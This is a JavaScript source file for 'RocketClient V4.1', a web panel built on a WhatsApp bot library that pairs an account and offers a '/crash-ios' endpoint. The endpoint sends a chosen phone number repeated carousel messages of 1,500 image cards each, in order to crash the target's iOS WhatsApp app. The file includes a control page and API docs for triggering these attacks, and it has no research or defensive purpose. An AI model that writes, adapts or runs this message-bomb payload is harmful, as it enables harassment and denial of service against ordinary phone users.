// index.js
const {
  generateWAMessageFromContent,
  getAggregateVotesInPollMessage,
  downloadContentFromMessage,
  useMultiFileAuthState,
  generateWAMessage,
  makeInMemoryStore,
  DisconnectReason,
  areJidsSameUser,
  getContentType,
  decryptPollVote,
  makeWASocket,
  relayMessage,
  jidDecode,
  Browsers,
  proto
} = require("@angstvorfrauen/baileys");
const gradient = require("gradient-string");
const crypto = require("crypto");
const cfonts = require("cfonts");
const figlet = require("figlet");
const path = require("path");
const pino = require("pino");
const os = require("os");
const fs = require("fs");
const Boom = require("@hapi/boom");
const express = require("express");
const app = express();

app.use(express.json());

// === BAILEYS ===
let sock;
let sessionExists = false;

async function connectBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
  sock = makeWASocket({
    printQRInTerminal: false,
    auth: state,
    logger: pino({ level: "silent" }),
  });

  sessionExists = sock.authState.creds.registered;

  sock.ev.on("messages.upsert", async chatUpdate => {
    let message = chatUpdate.messages[0];
    if (!message.message) return;
    message.message = (Object.keys(message.message)[0] === "ephemeralMessage")
        ? message.message.ephemeralMessage.message
        : message.message;
    if (message.key && message.key.remoteJid === "status@broadcast") return;
    if (message.key.id.startsWith("BAE5")) return;
    require("./main.js")(sock, message, chatUpdate);
  });

  sock.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server ? `${decode.user}@${decode.server}` : jid);
    } else {
      return jid;
    }
  };

  sock.public = true;

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = Boom.boomify(lastDisconnect?.error)?.output.statusCode;
      sessionExists = false;
      switch (reason) {
        case DisconnectReason.badSession:
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
          break;
        case DisconnectReason.loggedOut:
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
          break;
        default:
          connectBot();
      }
    } else if (connection === "open") {
      sessionExists = true;
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}
connectBot();

// === ROTAS WEB ===
app.get('/', (req, res) => {
  const isConnected = sessionExists;
  const connectButton = isConnected
    ? `<button disabled style="background:#666;cursor:not-allowed;">Sessão Ativa</button><p style="color:#0f0;">Bot já conectado!</p>`
    : `<button onclick="connect()">Conectar</button><div id="code"></div>`;

  const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rocket Client V4.1</title>
    <style>
        :root { --red: #ff0000; --darkred: #C00000; }
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
        h1 { font-size: 2.2em; background: linear-gradient(90deg, var(--red), var(--darkred)); -webkit-background-clip: text; color: transparent; margin-bottom: 10px; }
        .container { max-width: 600px; margin: 20px auto; background: #111; padding: 20px; border-radius: 10px; border: 1px solid var(--red); }
        input, button { padding: 12px; margin: 8px; width: 90%; border: 1px solid var(--red); background: #222; color: #fff; border-radius: 5px; font-size: 1em; }
        button { background: var(--red); color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover:not(:disabled) { background: var(--darkred); }
        button:disabled { background: #555; cursor: not-allowed; }
        #code, #result { margin-top: 15px; padding: 15px; background: #000; border: 1px solid #0f0; color: #0f0; text-align: left; font-family: monospace; white-space: pre-wrap; display: none; }
        .status { margin: 10px 0; font-size: 0.9em; }
        a { color: var(--red); text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>RocketClient V4.1</h1>
    <p>Lets start the Party</p>

    <div class="container">
        <div>
            <label>Número para conectar:</label>
            <input id="number" type="text" placeholder="5582993708218" ${isConnected ? 'disabled' : ''}>
            ${connectButton}
        </div>

        <hr style="border-color:#333;margin:20px 0;">

        <div>
            <button onclick="deleteSession()">Deletar Sessão</button>
        </div>

        <hr style="border-color:#333;margin:20px 0;">

        <div>
            <label>Crash iOS (número):</label>
            <input id="crashnumber" type="text" placeholder="5582993708218">
            <button onclick="crash()">Enviar Crash</button>
            <div id="result"></div>
        </div>

        <div class="status">
            <p><strong>Status:</strong> <span id="status">${isConnected ? 'Conectado' : 'Desconectado'}</span></p>
            <p><a href="/docs" target="_blank">Ver Documentação (APIs)</a></p>
        </div>
    </div>

    <script>
        const token = '@xd';
        async function connect() {
            const num = document.getElementById('number').value.trim();
            if (!num) return alert('Digite um número');
            const res = await fetch(\`/connect?token=\${token}&query=\${num}\`);
            const json = await res.json();
            const codeDiv = document.getElementById('code');
            codeDiv.style.display = 'block';
            codeDiv.innerText = JSON.stringify(json, null, 2);
            if (json.code) {
                alert('Código gerado! Escaneie no WhatsApp.');
                setTimeout(() => location.reload(), 3000);
            }
        }
        async function deleteSession() {
            if (!confirm('Tem certeza? Isso desconecta o bot.')) return;
            const res = await fetch(\`/deleteSession?token=\${token}\`);
            const json = await res.json();
            alert(json.success || json.error);
            location.reload();
        }
        async function crash() {
            const num = document.getElementById('crashnumber').value.trim();
            if (!num) return alert('Digite o número alvo');
            const res = await fetch(\`/crash-ios?token=\${token}&c=th2x&query=\${num}\`);
            const json = await res.json();
            const result = document.getElementById('result');
            result.style.display = 'block';
            result.innerText = JSON.stringify(json, null, 2);
        }
        setInterval(async () => {
            const res = await fetch('/status');
            const data = await res.json();
            document.getElementById('status').innerText = data.connected ? 'Conectado' : 'Desconectado';
        }, 5000);
    </script>
</body>
</html>
  `;
  res.send(html);
});

// === APIs ===
app.get('/status', (req, res) => {
  res.json({ connected: sessionExists });
});

app.get('/connect', async (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Token inválido' });
  if (sessionExists) return res.status(400).json({ error: 'Sessão já existe' });
  const phoneNumber = req.query.query?.replace(/[^0-9]/g, '');
  if (!phoneNumber) return res.status(400).json({ error: 'Número inválido' });

  try {
    let code = await sock.requestPairingCode(phoneNumber);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    res.json({ success: true, code });
  } catch (err) {
    res.status(500).json({ error: 'Erro ao gerar código', details: err.message });
  }
});

app.get('/deleteSession', (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Token inválido' });
  fs.rmSync("./database/Session", { recursive: true, force: true });
  sessionExists = false;
  connectBot();
  res.json({ success: 'Sessão deletada com sucesso' });
});

// Placeholder para mediaall.js
const { url = "https://i.imgur.com/xyz.jpg", fileSha256 = "abc", mediaKey = "abc", fileEncSha256 = "abc", directPath = "/abc", jpegThumbnail = "data:image/jpeg;base64,/9j/..." } = require("./database/mediaall.js") || {};

app.get('/crash-ios', async (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Token inválido' });
  if (!sessionExists) return res.status(400).json({ error: 'Bot não conectado' });
  const query = req.query.query?.replace(/[^0-9]/g, '');
  if (!query) return res.status(400).json({ error: 'Número inválido' });

  const target = query + '@s.whatsapp.net';
  try {
    for (let i = 0; i < 10; i++) {
      const singleCard = {
        "header": {
          "title": ".",
          "imageMessage": {
            "url": url,
            "mimetype": "image/jpeg",
            "caption": ".",
            "fileSha256": fileSha256,
            "fileLength": "10",
            "height": 1000,
            "width": 1000,
            "mediaKey": mediaKey,
            "fileEncSha256": fileEncSha256,
            "directPath": directPath,
            "jpegThumbnail": jpegThumbnail,
          },
          "hasMediaAttachment": true
        },
        "body": { "text": "." },
        "footer": { "text": "." },
        "nativeFlowMessage": {
          "buttons": [
            {
              "name": "cta_url",
              "buttonParamsJson": JSON.stringify({
                "display_text": "x",
                "url": "https://google.com",
                "merchant_url": "https://google.com"
              })
            }
          ]
        }
      };
      const card = Array(1500).fill(singleCard);
      await sock.sendjson(target, {
        "interactiveMessage": {
          "body": { "text": "." },
          "carouselMessage": { "cards": card }
        }
      });
    }
    res.json({ success: true, target, message: "Crash enviado com sucesso" });
  } catch (error) {
    res.status(500).json({ error: 'Falha ao enviar crash', details: error.message });
  }
});

app.get('/docs', (req, res) => {
  const docs = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RocketClient API Docs</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; line-height: 1.6; }
        pre { background: #111; padding: 15px; border: 1px solid #0f0; overflow-x: auto; }
        code { color: #ff0; }
        h1, h2 { color: #ff0000; }
        a { color: #00f; }
    </style>
</head>
<body>
    <h1>RocketClient V4.1 - API Docs</h1>
    <p><strong>Token:</strong> <code>@xd</code></p>
    <hr>

    <h2>/connect?token=@xd&query=<numero></h2>
    <p>Gera código de pareamento</p>
    <pre>GET /connect?token=@xd&query=5582993708218</pre>

    <h2>/deleteSession?token=@xd</h2>
    <p>Deleta a sessão atual</p>
    <pre>GET /deleteSession?token=@xd</pre>

    <h2>/crash-ios?token=@xd&c=th2x&query=<numero></h2>
    <p>Envia crash para iOS</p>
    <pre>GET /crash-ios?token=@xd&c=th2x&query=5582993708218</pre>

    <hr>
    <h2>Exemplos</h2>

    <h3>JavaScript</h3>
    <pre>
fetch('http://localhost:3000/connect?token=@xd&query=5582993708218')
  .then(r => r.json())
  .then(console.log);
    </pre>

    <h3>Python</h3>
    <pre>
import requests
r = requests.get('http://localhost:3000/connect', params={
    'token': '@xd',
    'query': '5582993708218'
})
print(r.json())
    </pre>

    <h3>PHP</h3>
    <pre>
&lt;?php
echo file_get_contents("http://localhost:3000/connect?token=@xd&query=5582993708218");
?&gt;
    </pre>

    <p><a href="/">Voltar</a></p>
</body>
</html>
  `;
  res.send(docs);
});

// === INICIAR SERVIDOR ===
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Docs: http://localhost:${PORT}/docs`);
});
